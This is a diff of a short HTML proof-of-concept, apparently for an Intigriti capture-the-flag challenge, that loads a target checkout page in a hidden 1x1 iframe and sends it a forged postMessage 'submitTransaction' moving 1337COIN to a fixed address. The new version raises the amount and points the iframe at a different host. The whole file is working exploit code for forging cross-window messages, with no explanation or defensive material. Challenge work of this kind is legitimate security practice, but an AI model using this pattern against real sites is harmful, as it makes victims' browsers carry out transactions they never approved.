@@ -1,36 +1,27 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>postMessage DOM XSS PoC</title>
+    <title>Intigriti CTF PoC</title>
 </head>
 <body>
 
-<h2>Loading…</h2>
-
 <iframe
-  id="victim"
-  src="https://challenge-0126.intigriti.io/marketplace.html?currency=1337COIN&price=1"
-  style="width:1px;height:1px;border:0;"
+    id="checkout"
+    src="https://app.intigriti.com/checkout.html?currency=1337COIN&price=1"
+    style="width:1px;height:1px;border:0;"
 ></iframe>
 
 <script>
-const iframe = document.getElementById("victim");
-
-iframe.onload = () => {
-  // crafted message the victim trusts
-  iframe.contentWindow.postMessage(
-    {
-      type: "submitTransaction",
-      transaction: {
-        toAddress: "174094f246eb6712e885d470519c0ad4d4",
-        currency: "1337COIN",
-        amount: 1
-      }
-    },
-    '*'
-  );
-};
+setTimeout(() => {
+    document.getElementById('checkout').contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+            currency: '1337COIN',
+            amount: 1337,
+            toAddress: '174094f246eb6712e885d470519c0ad4d4'
+        }
+    }, '*');
+}, 3000);
 </script>
 
 </body>
